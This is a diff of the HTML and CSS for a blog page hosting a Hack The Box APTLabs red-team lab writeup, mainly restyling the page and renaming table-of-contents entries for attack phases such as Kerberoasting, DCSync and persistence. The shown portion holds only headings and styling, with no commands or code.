@@ -3,563 +3,239 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>HTB APTLabs — Full-Chain Writeup by QA210</title>
+<title>APTLabs — QA210</title>
 <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism-tomorrow.min.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css">
 <style>
-/* ── CSS Custom Properties ── */
-:root {
-  --bg:       #0a0e17;
-  --bg2:      #111827;
-  --card:     #151d2e;
-  --border:   #1e293b;
-  --fg:       #e2e8f0;
-  --muted:    #94a3b8;
-  --accent:   #38bdf8;
-  --accent2:  #818cf8;
-  --red:      #f87171;
-  --green:    #4ade80;
-  --yellow:   #facc15;
-  --orange:   #fb923c;
-  --pink:     #f472b6;
-  --font:     'Segoe UI', system-ui, -apple-system, sans-serif;
-  --mono:     'Cascadia Code', 'Fira Code', 'JetBrains Mono', Consolas, monospace;
-  --radius:   8px;
-  --shadow:   0 4px 24px rgba(0,0,0,.45);
-  --glow:     0 0 30px rgba(56,189,248,.12);
-}
+:root{--bg:#0a0e17;--bg2:#111827;--card:#151d2e;--border:#1e293b;--fg:#e2e8f0;--muted:#94a3b8;--accent:#38bdf8;--accent2:#818cf8;--red:#f87171;--green:#4ade80;--yellow:#facc15;--orange:#fb923c;--pink:#f472b6;--font:'Segoe UI',system-ui,-apple-system,sans-serif;--mono:'Cascadia Code','Fira Code','JetBrains Mono',Consolas,monospace;--radius:8px;--shadow:0 4px 24px rgba(0,0,0,.45);--glow:0 0 30px rgba(56,189,248,.12);--yellow-accent:#facc15}
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+html{scroll-behavior:smooth}
+body{font-family:var(--font);background:var(--bg);color:var(--fg);line-height:1.75;min-height:100vh;overflow-x:hidden}
+#bg-canvas{position:fixed;inset:0;z-index:-1;opacity:.3}
 
-/* ── Reset ── */
-*, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
-html { scroll-behavior: smooth; }
+/* ═══ SITE HEADER ═══ */
+.site-header{position:sticky;top:0;z-index:1000;background:rgba(10,14,23,.92);backdrop-filter:blur(14px);border-bottom:1px solid var(--border);padding:0 32px;display:flex;align-items:center;justify-content:space-between;height:56px}
+.brand{display:flex;align-items:center;gap:10px;text-decoration:none;color:var(--fg);font-weight:700;font-size:1.1rem}
+.logo-icon{display:inline-flex;align-items:center;justify-content:center;width:32px;height:32px;background:linear-gradient(135deg,var(--accent),var(--accent2));border-radius:6px;font-weight:900;font-size:.9rem;color:#0a0e17}
+.cursor{display:inline-block;width:2px;height:1em;background:var(--accent);margin-left:2px;animation:blink 1s step-end infinite}
+@keyframes blink{50%{opacity:0}}
+.nav-main{display:flex;align-items:center;gap:24px}
+.nav-main a{color:var(--muted);text-decoration:none;font-size:.85rem;transition:color .2s}
+.nav-main a:hover,.nav-main a.active{color:var(--fg)}
+.nav-main a.active{border-bottom:2px solid var(--accent)}
+.nav-right{display:flex;align-items:center;gap:16px}
+.social-link{color:var(--muted);font-size:1.1rem;transition:color .2s}
+.social-link:hover{color:var(--fg)}
+.mobile-toggle{display:none;background:none;border:none;color:var(--fg);font-size:1.4rem;cursor:pointer}
+.mobile-nav-overlay,.mobile-nav-panel{display:none}
 
-body {
-  font-family: var(--font);
-  background: var(--bg);
-  color: var(--fg);
-  line-height: 1.75;
-  min-height: 100vh;
-  overflow-x: hidden;
-}
+/* ═══ PAGE LAYOUT ═══ */
+.page-wrap{display:flex;max-width:1440px;margin:0 auto;min-height:calc(100vh - 56px)}
+.toc{position:sticky;top:56px;width:260px;min-width:260px;height:calc(100vh - 56px);overflow-y:auto;padding:20px 14px;border-right:1px solid var(--border);background:rgba(10,14,23,.85);backdrop-filter:blur(12px);scrollbar-width:thin;scrollbar-color:var(--border) transparent}
+.toc h3{font-size:.68rem;text-transform:uppercase;letter-spacing:2px;color:var(--accent);margin-bottom:10px}
+.toc a{display:block;font-size:.76rem;color:var(--muted);text-decoration:none;padding:3px 0 3px 12px;border-left:2px solid transparent;transition:all .2s}
+.toc a:hover,.toc a.active{color:var(--fg);border-left-color:var(--accent);background:rgba(56,189,248,.06)}
+.toc .toc-sub{padding-left:24px;font-size:.7rem}
+.main{flex:1;padding:36px 48px 80px;max-width:900px}
 
-/* ── Three.js canvas background ── */
-#bg-canvas {
-  position: fixed;
-  inset: 0;
-  z-index: -1;
-  opacity: .35;
-}
+/* ═══ HERO ═══ */
+.hero{text-align:center;padding:48px 0 36px;border-bottom:1px solid var(--border);margin-bottom:36px}
+.hero .badge{display:inline-block;background:linear-gradient(135deg,var(--red),var(--orange));color:#fff;font-size:.62rem;font-weight:700;text-transform:uppercase;letter-spacing:1.5px;padding:4px 14px;border-radius:20px;margin-bottom:14px}
+.hero h1{font-size:2.2rem;font-weight:800;background:linear-gradient(135deg,var(--accent),var(--accent2),var(--pink));-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text;margin-bottom:8px}
+.hero .sub{font-size:1rem;color:var(--muted);margin-bottom:20px}
+.hero .meta-grid{display:grid;grid-template-columns:repeat(4,1fr);gap:10px;margin-top:20px}
+.hero .meta-box{background:var(--card);border:1px solid var(--border);border-radius:var(--radius);padding:12px 6px;text-align:center}
+.meta-box .val{font-size:1.3rem;font-weight:700;color:var(--accent)}
+.meta-box .lbl{font-size:.62rem;text-transform:uppercase;letter-spacing:1px;color:var(--muted);margin-top:2px}
 
-/* ── Layout ── */
-.page-wrap {
-  display: flex;
-  max-width: 1440px;
-  margin: 0 auto;
-  min-height: 100vh;
-}
+/* ═══ ATTACK PATH ═══ */
+.attack-path{background:var(--card);border:1px solid var(--border);border-radius:var(--radius);padding:24px;margin:28px 0;overflow-x:auto}
+.attack-path h3{font-size:.78rem;text-transform:uppercase;letter-spacing:1.5px;color:var(--accent);margin-bottom:14px;text-align:center}
+.path-flow{display:flex;align-items:center;justify-content:center;gap:5px;flex-wrap:wrap}
+.path-node{background:linear-gradient(135deg,rgba(56,189,248,.12),rgba(129,140,248,.12));border:1px solid var(--accent);border-radius:6px;padding:7px 12px;font-size:.7rem;font-weight:600;color:var(--fg);white-space:nowrap;transition:all .25s}
+.path-node:hover{background:linear-gradient(135deg,rgba(56,189,248,.25),rgba(129,140,248,.25));transform:translateY(-2px);box-shadow:var(--glow)}
+.path-arrow{color:var(--accent);font-size:1rem;flex-shrink:0}
 
-/* ── TOC Sidebar ── */
-.toc {
-  position: sticky;
-  top: 0;
-  width: 280px;
-  min-width: 280px;
-  height: 100vh;
-  overflow-y: auto;
-  padding: 24px 16px;
-  border-right: 1px solid var(--border);
-  background: rgba(10,14,23,.85);
-  backdrop-filter: blur(12px);
-  scrollbar-width: thin;
-  scrollbar-color: var(--border) transparent;
-}
-.toc h3 {
-  font-size: .7rem;
-  text-transform: uppercase;
-  letter-spacing: 2px;
-  color: var(--accent);
-  margin-bottom: 12px;
-}
-.toc a {
-  display: block;
-  font-size: .78rem;
-  color: var(--muted);
-  text-decoration: none;
-  padding: 4px 0 4px 12px;
-  border-left: 2px solid transparent;
-  transition: all .2s;
-}
-.toc a:hover,
-.toc a.active {
-  color: var(--fg);
-  border-left-color: var(--accent);
-  background: rgba(56,189,248,.06);
-}
-.toc .toc-sub {
-  padding-left: 24px;
-  font-size: .72rem;
-}
+/* ═══ SECTIONS ═══ */
+.section{margin-bottom:44px}
+.section h2{font-size:1.5rem;font-weight:700;margin-bottom:18px;padding-bottom:8px;border-bottom:2px solid var(--accent);display:flex;align-items:center;gap:10px}
+.section h2 .icon{font-size:1.2rem}
+.section h3{font-size:1.1rem;font-weight:600;margin:26px 0 12px;color:var(--accent2)}
+.section h4{font-size:.92rem;font-weight:600;margin:18px 0 8px;color:var(--accent)}
+.section p{margin-bottom:13px;color:var(--fg)}
+.section ul,.section ol{margin:10px 0 16px 24px}
+.section li{margin-bottom:6px;color:var(--fg)}
 
-/* ── Main Content ── */
-.main {
-  flex: 1;
-  padding: 40px 48px 80px;
-  max-width: 900px;
-}
+/* ═══ CALLOUTS ═══ */
+.callout{border-radius:var(--radius);padding:14px 18px;margin:18px 0;border-left:4px solid;font-size:.88rem}
+.callout p{margin-bottom:7px}.callout p:last-child{margin-bottom:0}
+.callout-info{background:rgba(56,189,248,.08);border-color:var(--accent)}
+.callout-warn{background:rgba(250,204,21,.08);border-color:var(--yellow)}
+.callout-danger{background:rgba(248,113,113,.08);border-color:var(--red)}
+.callout-success{background:rgba(74,222,128,.08);border-color:var(--green)}
+.callout-hint{background:rgba(129,140,248,.08);border-color:var(--accent2)}
+.callout-deadend{background:rgba(251,146,60,.06);border-color:var(--orange)}
+.callout-title{font-weight:700;font-size:.76rem;text-transform:uppercase;letter-spacing:1px;margin-bottom:5px}
+.callout-info .callout-title{color:var(--accent)}.callout-warn .callout-title{color:var(--yellow)}
+.callout-danger .callout-title{color:var(--red)}.callout-success .callout-title{color:var(--green)}
+.callout-hint .callout-title{color:var(--accent2)}.callout-deadend .callout-title{color:var(--orange)}
 
-/* ── Hero ── */
-.hero {
-  text-align: center;
-  padding: 60px 0 40px;
-  border-bottom: 1px solid var(--border);
-  margin-bottom: 40px;
-}
-.hero .badge {
-  display: inline-block;
-  background: linear-gradient(135deg, var(--red), var(--orange));
-  color: #fff;
-  font-size: .65rem;
-  font-weight: 700;
-  text-transform: uppercase;
-  letter-spacing: 1.5px;
-  padding: 4px 14px;
-  border-radius: 20px;
-  margin-bottom: 16px;
-}
-.hero h1 {
-  font-size: 2.4rem;
-  font-weight: 800;
-  background: linear-gradient(135deg, var(--accent), var(--accent2), var(--pink));
-  -webkit-background-clip: text;
-  -webkit-text-fill-color: transparent;
-  background-clip: text;
-  margin-bottom: 8px;
-}
-.hero .sub {
-  font-size: 1.05rem;
-  color: var(--muted);
-  margin-bottom: 24px;
-}
-.hero .meta-grid {
-  display: grid;
-  grid-template-columns: repeat(4,1fr);
-  gap: 12px;
-  margin-top: 24px;
-}
-.hero .meta-box {
-  background: var(--card);
-  border: 1px solid var(--border);
-  border-radius: var(--radius);
-  padding: 14px 8px;
-  text-align: center;
-}
-.meta-box .val {
-  font-size: 1.4rem;
-  font-weight: 700;
-  color: var(--accent);
-}
-.meta-box .lbl {
-  font-size: .65rem;
-  text-transform: uppercase;
-  letter-spacing: 1px;
-  color: var(--muted);
-  margin-top: 2px;
-}
+/* ═══ CODE ═══ */
+.code-block{position:relative;margin:14px 0;border-radius:var(--radius);overflow:hidden;border:1px solid var(--border)}
+.code-block .code-header{display:flex;align-items:center;justify-content:space-between;background:#1a1f2e;padding:5px 12px;font-size:.68rem;color:var(--muted)}
+.code-block .code-header .lang-tag{font-weight:600;text-transform:uppercase;letter-spacing:1px;color:var(--accent)}
+.code-block pre{margin:0!important;padding:14px!important;font-size:.8rem!important;line-height:1.6!important;background:#0d1117!important}
+.code-block code{font-family:var(--mono)!important;font-size:.8rem!important}
+.copy-btn{background:transparent;border:1px solid var(--border);color:var(--muted);font-size:.63rem;padding:2px 8px;border-radius:4px;cursor:pointer;transition:all .2s}
+.copy-btn:hover{color:var(--fg);border-color:var(--accent)}
 
-/* ── Attack Path Diagram ── */
-.attack-path {
-  background: var(--card);
-  border: 1px solid var(--border);
-  border-radius: var(--radius);
-  padding: 28px;
-  margin: 32px 0;
-  overflow-x: auto;
-}
-.attack-path h3 {
-  font-size: .8rem;
-  text-transform: uppercase;
-  letter-spacing: 1.5px;
-  color: var(--accent);
-  margin-bottom: 16px;
-  text-align: center;
-}
-.path-flow {
-  display: flex;
-  align-items: center;
-  justify-content: center;
-  gap: 6px;
-  flex-wrap: wrap;
-}
-.path-node {
-  background: linear-gradient(135deg, rgba(56,189,248,.12), rgba(129,140,248,.12));
-  border: 1px solid var(--accent);
-  border-radius: 6px;
-  padding: 8px 14px;
-  font-size: .72rem;
-  font-weight: 600;
-  color: var(--fg);
-  white-space: nowrap;
-  transition: all .25s;
-}
-.path-node:hover {
-  background: linear-gradient(135deg, rgba(56,189,248,.25), rgba(129,140,248,.25));
-  transform: translateY(-2px);
-  box-shadow: var(--glow);
-}
-.path-arrow {
-  color: var(--accent);
-  font-size: 1.1rem;
-  flex-shrink: 0;
-}
+/* ═══ BADGES & TABLES ═══ */
+.mitre-badge{display:inline-block;background:rgba(244,114,182,.1);border:1px solid rgba(244,114,182,.25);color:var(--pink);font-size:.63rem;font-weight:600;padding:2px 7px;border-radius:4px;margin:2px;font-family:var(--mono)}
+.data-table{width:100%;border-collapse:collapse;margin:14px 0;font-size:.83rem}
+.data-table th{background:var(--card);padding:9px 12px;text-align:left;font-size:.68rem;text-transform:uppercase;letter-spacing:1px;color:var(--accent);border-bottom:2px solid var(--border)}
+.data-table td{padding:9px 12px;border-bottom:1px solid var(--border);color:var(--fg)}
+.data-table tr:hover td{background:rgba(56,189,248,.04)}
+.data-table code{font-family:var(--mono);font-size:.78rem;color:var(--accent)}
 
-/* ── Sections ── */
-.section {
-  margin-bottom: 48px;
-}
-.section h2 {
-  font-size: 1.6rem;
-  font-weight: 700;
-  margin-bottom: 20px;
-  padding-bottom: 8px;
-  border-bottom: 2px solid var(--accent);
-  display: flex;
-  align-items: center;
-  gap: 10px;
-}
-.section h2 .icon {
-  font-size: 1.3rem;
-}
-.section h3 {
-  font-size: 1.15rem;
-  font-weight: 600;
-  margin: 28px 0 12px;
-  color: var(--accent2);
-}
-.section h4 {
-  font-size: .95rem;
-  font-weight: 600;
-  margin: 20px 0 8px;
-  color: var(--accent);
-}
-.section p {
-  margin-bottom: 14px;
-  color: var(--fg);
-}
-.section ul, .section ol {
-  margin: 10px 0 16px 24px;
-}
-.section li {
-  margin-bottom: 6px;
-  color: var(--fg);
-}
+/* ═══ SPECIAL ═══ */
+.flag-box{background:linear-gradient(135deg,rgba(74,222,128,.08),rgba(34,211,238,.08));border:1px solid rgba(74,222,128,.25);border-radius:var(--radius);padding:12px 18px;margin:14px 0;display:flex;align-items:center;gap:12px}
+.flag-box .flag-icon{font-size:1.2rem}.flag-box .flag-name{font-weight:700;color:var(--green);font-size:.83rem;font-family:var(--mono)}.flag-box .flag-detail{font-size:.78rem;color:var(--muted)}
+.network-diagram{background:var(--card);border:1px solid var(--border);border-radius:var(--radius);padding:22px;margin:22px 0;font-family:var(--mono);font-size:.66rem;line-height:1.35;color:var(--muted);overflow-x:auto;white-space:pre}
+.reset-banner{background:linear-gradient(135deg,rgba(248,113,113,.12),rgba(251,146,60,.12));border:1px solid rgba(248,113,113,.3);border-radius:var(--radius);padding:18px 22px;margin:22px 0;text-align:center}
+.reset-banner .big{font-size:1.05rem;font-weight:700;color:var(--red);margin-bottom:5px}.reset-banner .desc{font-size:.83rem;color:var(--muted)}
+.timeline{position:relative;padding-left:26px;margin:18px 0}
+.timeline::before{content:'';position:absolute;left:8px;top:0;bottom:0;width:2px;background:var(--border)}
+.timeline-item{position:relative;margin-bottom:18px}
+.timeline-item::before{content:'';position:absolute;left:-22px;top:6px;width:9px;height:9px;border-radius:50%;background:var(--accent);border:2px solid var(--bg)}
+.timeline-item.struggle::before{background:var(--orange)}.timeline-item.fail::before{background:var(--red)}
+.timeline-item .tl-time{font-size:.68rem;font-family:var(--mono);color:var(--accent);margin-bottom:2px}
+.timeline-item.struggle .tl-time{color:var(--orange)}.timeline-item.fail .tl-time{color:var(--red)}
+.timeline-item .tl-text{font-size:.83rem;color:var(--fg)}
+.day-box{background:var(--card);border:1px solid var(--border);border-radius:var(--radius);padding:16px 20px;margin:14px 0}
+.day-box .day-num{font-size:.68rem;font-weight:700;text-transform:uppercase;letter-spacing:1.5px;color:var(--accent);margin-bottom:7px}
+.day-box .day-summary{font-size:.86rem;color:var(--fg);margin-bottom:7px}.day-box .day-detail{font-size:.8rem;color:var(--muted)}
+.day-box.struggle-day{border-color:rgba(251,146,60,.25)}.day-box.struggle-day .day-num{color:var(--orange)}
+.term-out{background:#0c0c0c;border:1px solid var(--border);border-radius:var(--radius);padding:12px 16px;margin:12px 0;font-family:var(--mono);font-size:.74rem;line-height:1.5;color:#ccc;overflow-x:auto;white-space:pre-wrap;word-break:break-all}
+.term-out .prompt{color:var(--accent)}.term-out .err{color:var(--red)}.term-out .ok{color:var(--green)}.term-out .warn{color:var(--yellow)}.term-out .muted{color:#666}
+.operator-sig{text-align:center;padding:28px 0;border-top:1px solid var(--border);margin-top:44px}
+.operator-sig .handle{font-size:1.1rem;font-weight:700;background:linear-gradient(135deg,var(--accent),var(--pink));-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text}
+.operator-sig .tagline{font-size:.76rem;color:var(--muted);margin-top:4px}
 
-/* ── Callout Boxes ── */
-.callout {
-  border-radius: var(--radius);
-  padding: 16px 20px;
-  margin: 20px 0;
-  border-left: 4px solid;
-  font-size: .9rem;
-}
-.callout p { margin-bottom: 8px; }
-.callout p:last-child { margin-bottom: 0; }
-.callout-info    { background: rgba(56,189,248,.08);  border-color: var(--accent);  }
-.callout-warn    { background: rgba(250,204,21,.08);  border-color: var(--yellow);  }
-.callout-danger  { background: rgba(248,113,113,.08); border-color: var(--red);     }
-.callout-success { background: rgba(74,222,128,.08);  border-color: var(--green);   }
-.callout-hint    { background: rgba(129,140,248,.08); border-color: var(--accent2); }
-.callout-title {
-  font-weight: 700;
-  font-size: .78rem;
-  text-transform: uppercase;
-  letter-spacing: 1px;
-  margin-bottom: 6px;
-}
-.callout-info    .callout-title { color: var(--accent);  }
-.callout-warn    .callout-title { color: var(--yellow);  }
-.callout-danger  .callout-title { color: var(--red);     }
-.callout-success .callout-title { color: var(--green);   }
-.callout-hint    .callout-title { color: var(--accent2); }
+/* ═══ MOBILE NAV ═══ */
+.mobile-nav-overlay{display:none;position:fixed;inset:0;background:rgba(0,0,0,.6);z-index:2000}
+.mobile-nav-overlay.show{display:block}
+.mobile-nav-panel{display:none;position:fixed;top:0;right:0;width:280px;height:100vh;background:var(--bg2);z-index:2001;padding:24px;transform:translateX(100%);transition:transform .3s}
+.mobile-nav-panel.show{display:block;transform:translateX(0)}
+.mobile-nav-panel nav{display:flex;flex-direction:column;gap:16px;margin-top:32px}
+.mobile-nav-panel nav a{color:var(--fg);text-decoration:none;font-size:1rem}
+.mnp-close{background:none;border:none;color:var(--fg);font-size:1.2rem;cursor:pointer;float:right}
 
-/* ── Code Blocks ── */
-.code-block {
-  position: relative;
-  margin: 16px 0;
-  border-radius: var(--radius);
-  overflow: hidden;
-  border: 1px solid var(--border);
+/* ═══ RESPONSIVE ═══ */
+@media(max-width:960px){
+.toc{display:none}
+.main{padding:20px 18px 60px}
+.hero h1{font-size:1.5rem}
+.hero .meta-grid{grid-template-columns:repeat(2,1fr)}
+.path-flow{flex-direction:column}.path-arrow{transform:rotate(90deg)}
+.nav-main a:not(.active){display:none}
+.mobile-toggle{display:block}
+.site-header{padding:0 16px}
 }
-.code-block .code-header {
-  display: flex;
-  align-items: center;
-  justify-content: space-between;
-  background: #1a1f2e;
-  padding: 6px 14px;
-  font-size: .7rem;
-  color: var(--muted);
-}
-.code-block .code-header .lang-tag {
-  font-weight: 600;
-  text-transform: uppercase;
-  letter-spacing: 1px;
-  color: var(--accent);
-}
-.code-block pre {
-  margin: 0 !important;
-  padding: 16px !important;
-  font-size: .82rem !important;
-  line-height: 1.65 !important;
-  background: #0d1117 !important;
-}
-.code-block code {
-  font-family: var(--mono) !important;
-  font-size: .82rem !important;
-}
-.copy-btn {
-  background: transparent;
-  border: 1px solid var(--border);
-  color: var(--muted);
-  font-size: .65rem;
-  padding: 3px 10px;
-  border-radius: 4px;
-  cursor: pointer;
-  transition: all .2s;
-}
-.copy-btn:hover { color: var(--fg); border-color: var(--accent); }
-
-/* ── MITRE Badges ── */
-.mitre-badge {
-  display: inline-block;
-  background: rgba(244,114,182,.1);
-  border: 1px solid rgba(244,114,182,.25);
-  color: var(--pink);
-  font-size: .65rem;
-  font-weight: 600;
-  padding: 2px 8px;
-  border-radius: 4px;
-  margin: 2px;
-  font-family: var(--mono);
-}
-
-/* ── Data Tables ── */
-.data-table {
-  width: 100%;
-  border-collapse: collapse;
-  margin: 16px 0;
-  font-size: .85rem;
-}
-.data-table th {
-  background: var(--card);
-  padding: 10px 14px;
-  text-align: left;
-  font-size: .7rem;
-  text-transform: uppercase;
-  letter-spacing: 1px;
-  color: var(--accent);
-  border-bottom: 2px solid var(--border);
-}
-.data-table td {
-  padding: 10px 14px;
-  border-bottom: 1px solid var(--border);
-  color: var(--fg);
-}
-.data-table tr:hover td { background: rgba(56,189,248,.04); }
-.data-table code {
-  font-family: var(--mono);
-  font-size: .8rem;
-  color: var(--accent);
-}
-
-/* ── Flag Box ── */
-.flag-box {
-  background: linear-gradient(135deg, rgba(74,222,128,.08), rgba(34,211,238,.08));
-  border: 1px solid rgba(74,222,128,.25);
-  border-radius: var(--radius);
-  padding: 14px 20px;
-  margin: 16px 0;
-  display: flex;
-  align-items: center;
-  gap: 12px;
-}
-.flag-box .flag-icon {
-  font-size: 1.3rem;
-}
-.flag-box .flag-name {
-  font-weight: 700;
-  color: var(--green);
-  font-size: .85rem;
-}
-.flag-box .flag-detail {
-  font-size: .8rem;
-  color: var(--muted);
-}
-
-/* ── Network Diagram ── */
-.network-diagram {
-  background: var(--card);
-  border: 1px solid var(--border);
-  border-radius: var(--radius);
-  padding: 24px;
-  margin: 24px 0;
-  font-family: var(--mono);
-  font-size: .72rem;
-  line-height: 1.4;
-  color: var(--muted);
-  overflow-x: auto;
-  white-space: pre;
-}
-
-/* ── Daily Reset Warning Banner ── */
-.reset-banner {
-  background: linear-gradient(135deg, rgba(248,113,113,.12), rgba(251,146,60,.12));
-  border: 1px solid rgba(248,113,113,.3);
-  border-radius: var(--radius);
-  padding: 20px 24px;
-  margin: 24px 0;
-  text-align: center;
-}
-.reset-banner .big {
-  font-size: 1.1rem;
-  font-weight: 700;
-  color: var(--red);
-  margin-bottom: 6px;
-}
-.reset-banner .desc {
-  font-size: .85rem;
-  color: var(--muted);
-}
-
-/* ── Timeline Box ── */
-.timeline {
-  position: relative;
-  padding-left: 28px;
-  margin: 20px 0;
-}
-.timeline::before {
-  content: '';
-  position: absolute;
-  left: 8px;
-  top: 0;
-  bottom: 0;
-  width: 2px;
-  background: var(--border);
-}
-.timeline-item {
-  position: relative;
-  margin-bottom: 20px;
-}
-.timeline-item::before {
-  content: '';
-  position: absolute;
-  left: -24px;
-  top: 6px;
-  width: 10px;
-  height: 10px;
-  border-radius: 50%;
-  background: var(--accent);
-  border: 2px solid var(--bg);
-}
-.timeline-item .tl-time {
-  font-size: .7rem;
-  font-family: var(--mono);
-  color: var(--accent);
-  margin-bottom: 2px;
-}
-.timeline-item .tl-text {
-  font-size: .85rem;
-  color: var(--fg);
-}
-
-/* ── Responsive ── */
-@media (max-width: 960px) {
-  .toc { display: none; }
-  .main { padding: 24px 20px 60px; }
-  .hero h1 { font-size: 1.6rem; }
-  .hero .meta-grid { grid-template-columns: repeat(2,1fr); }
-  .path-flow { flex-direction: column; }
-  .path-arrow { transform: rotate(90deg); }
-}
-
-/* ── Scrollbar ── */
-::-webkit-scrollbar { width: 6px; }
-::-webkit-scrollbar-track { background: transparent; }
-::-webkit-scrollbar-thumb { background: var(--border); border-radius: 3px; }
-::-webkit-scrollbar-thumb:hover { background: var(--muted); }
-
-/* ── Operator Sig ── */
-.operator-sig {
-  text-align: center;
-  padding: 32px 0;
-  border-top: 1px solid var(--border);
-  margin-top: 48px;
-}
-.operator-sig .handle {
-  font-size: 1.2rem;
-  font-weight: 700;
-  background: linear-gradient(135deg, var(--accent), var(--pink));
-  -webkit-background-clip: text;
-  -webkit-text-fill-color: transparent;
-  background-clip: text;
-}
-.operator-sig .tagline {
-  font-size: .78rem;
-  color: var(--muted);
-  margin-top: 4px;
-}
+::-webkit-scrollbar{width:5px}::-webkit-scrollbar-track{background:transparent}::-webkit-scrollbar-thumb{background:var(--border);border-radius:3px}::-webkit-scrollbar-thumb:hover{background:var(--muted)}
 </style>
 </head>
 <body>
 
 <canvas id="bg-canvas"></canvas>
 
+<!-- ═══════════ HEADER ═══════════ -->
+<header class="site-header">
+  <a href="/" class="brand">
+    <span class="logo-icon">Q</span>
+    QA210<span class="cursor"></span>
+  </a>
+  <nav class="nav-main">
+    <a href="/">Home</a>
+    <a href="/htb/" class="active">Hack The Box</a>
+    <a href="/tjctf-2026/">TJCTF</a>
+    <a href="/tryhackme/">TryHackMe</a>
+    <a href="/research/">Research</a>
+  </nav>
+  <div class="nav-right">
+    <a href="https://github.com/Yuri08-QA210" target="_blank" class="social-link" title="GitHub"><i class="bi bi-github"></i></a>
+    <a href="https://w4llz.me/" target="_blank" class="social-link" title="W4LLZ Team" style="color:var(--yellow-accent)"><i class="bi bi-people-fill"></i></a>
+    <button class="mobile-toggle" onclick="toggleMobileNav()" aria-label="Menu"><i class="bi bi-list"></i></button>
+  </div>
+</header>
+
+<!-- Mobile Nav -->
+<div class="mobile-nav-overlay" id="mobileOverlay" onclick="toggleMobileNav()"></div>
+<div class="mobile-nav-panel" id="mobilePanel">
+  <button class="mnp-close" onclick="toggleMobileNav()"><i class="bi bi-x-lg"></i></button>
+  <nav>
+    <a href="/">Home</a>
+    <a href="/htb/">Hack The Box</a>
+    <a href="/tjctf-2026/">TJCTF</a>
+    <a href="/tryhackme/">TryHackMe</a>
+    <a href="/research/">Research</a>
+    <a href="https://github.com/Yuri08-QA210" target="_blank">GitHub</a>
+    <a href="https://w4llz.me/" target="_blank">W4LLZ Team</a>
+  </nav>
+</div>
+
 <div class="page-wrap">
 
-<!-- ══════════════ TOC ══════════════ -->
+<!-- ═══════════ TOC ═══════════ -->
 <nav class="toc" id="toc">
   <h3>Table of Contents</h3>
   <a href="#overview">Lab Overview</a>
+  <a href="#timeline">Day-by-Day Timeline</a>
   <a href="#network-map">Network Map</a>
   <a href="#daily-reset">Daily Reset Strategy</a>
   <a href="#phase1">Phase 1: Initial Access</a>
-  <a class="toc-sub" href="#p1-osint">OSINT &amp; Recon</a>
   <a class="toc-sub" href="#p1-phishing">Phishing Campaign</a>
   <a class="toc-sub" href="#p1-evasion">Defender Evasion</a>
   <a class="toc-sub" href="#p1-c2">C2 Infrastructure</a>
   <a href="#phase2">Phase 2: Internal Recon</a>
-  <a class="toc-sub" href="#p2-bloodhound">BloodHound &amp; SharpHound</a>
-  <a class="toc-sub" href="#p2-powerview">PowerView Enumeration</a>
+  <a class="toc-sub" href="#p2-bloodhound">BloodHound</a>
+  <a class="toc-sub" href="#p2-powerview">PowerView</a>
   <a class="toc-sub" href="#p2-situational">Situational Awareness</a>
   <a href="#phase3">Phase 3: Privilege Escalation</a>
   <a class="toc-sub" href="#p3-kerberoast">Kerberoasting</a>
   <a class="toc-sub" href="#p3-asrep">AS-REP Roasting</a>
-  <a class="toc-sub" href="#p3-hashcrack">Hash Cracking</a>
   <a class="toc-sub" href="#p3-token">Token Impersonation</a>
+  <a class="toc-sub" href="#p3-lsassy">Lsassy Credential Dump</a>
+  <a class="toc-sub" href="#p3-hashcrack">Hash Cracking</a>
   <a href="#phase4">Phase 4: Lateral Movement</a>
-  <a class="toc-sub" href="#p4-relay">SMB Relay &amp; DNS</a>
+  <a class="toc-sub" href="#p4-relay">SMB Relay + DNS</a>
   <a class="toc-sub" href="#p4-opth">Over-Pass-the-Hash</a>
   <a class="toc-sub" href="#p4-rbcd">RBCD Abuse</a>
-  <a class="toc-sub" href="#p4-pivoting">Pivoting &amp; SOCKS</a>
+  <a class="toc-sub" href="#p4-pivoting">Pivoting + DCOM/WMI</a>
   <a href="#phase5">Phase 5: Domain Domination</a>
-  <a class="toc-sub" href="#p5-dcsync">DCSync Attack</a>
+  <a class="toc-sub" href="#p5-dcsync">DCSync</a>
   <a class="toc-sub" href="#p5-golden">Golden Ticket</a>
   <a class="toc-sub" href="#p5-silver">Silver Tickets</a>
+  <a class="toc-sub" href="#p5-veeam">Veeam Creds</a>
   <a href="#phase6">Phase 6: Forest Trust</a>
-  <a class="toc-sub" href="#p6-trust-enum">Trust Enumeration</a>
-  <a class="toc-sub" href="#p6-cross-forest">Cross-Forest Compromise</a>
+  <a class="toc-sub" href="#p6-meridian">Meridian Healthcare</a>
+  <a class="toc-sub" href="#p6-nexus">Nexus Financial</a>
   <a href="#phase7">Phase 7: Persistence</a>
-  <a href="#phase8">Phase 8: Data Exfiltration</a>
+  <a class="toc-sub" href="#p7-wmi">WMI Event Subscriptions</a>
+  <a class="toc-sub" href="#p7-registry">Registry Hijacking</a>
+  <a class="toc-sub" href="#p7-dll">DLL Sideloading</a>
+  <a class="toc-sub" href="#p7-lolbas">LOLBAS</a>
+  <a href="#phase8">Phase 8: Exfiltration</a>
   <a href="#flags">Flag Summary</a>
   <a href="#lessons">Key Lessons</a>
 </nav>
 
-<!-- ══════════════ MAIN ══════════════ -->
 <div class="main">
 
 <!-- ──── HERO ──── -->
 <section class="hero">
-  <span class="badge">Red Team Operator Level 3</span>
-  <h1>HTB APTLabs<br>Full-Chain Writeup</h1>
-  <p class="sub">Operator: QA210 &mdash; Complete network compromise from phishing to forest domination</p>
-
+  <span class="badge">Red Team Operator Level III</span>
+  <h1>APTLabs<br>Full-Chain Writeup</h1>
+  <p class="sub">QA210 &mdash; 8 days, 3 forests, 20 flags, lots of dead ends</p>
   <div class="meta-grid">
     <div class="meta-box"><div class="val">18</div><div class="lbl">Machines</div></div>
     <div class="meta-box"><div class="val">20</div><div class="lbl">Flags</div></div>
@@ -568,21 +244,22 @@ body {
   </div>
 </section>
 
-<!-- ──── ATTACK PATH DIAGRAM ──── -->
 <div class="attack-path">
-  <h3>Full Attack Path</h3>
